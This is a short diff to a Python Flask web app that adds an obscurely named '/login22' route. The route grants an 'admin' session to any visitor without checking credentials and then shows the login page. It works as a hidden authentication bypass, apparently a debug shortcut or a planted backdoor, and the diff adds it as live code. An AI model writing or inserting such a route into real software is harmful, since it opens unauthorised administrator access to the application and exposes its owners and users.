@@ -197,6 +197,15 @@ def get_categories():
 def contact():
     return render_template("contact.html")
 
+
+
+@app.route("/login22", methods=["GET", "POST"])
+def login222():
+    session["user"] = "admin"
+    return render_template("login.html")
+
+
+
 # always leave in the end 
 if __name__ == "__main__":
     app.run(host=os.environ.get("IP"),
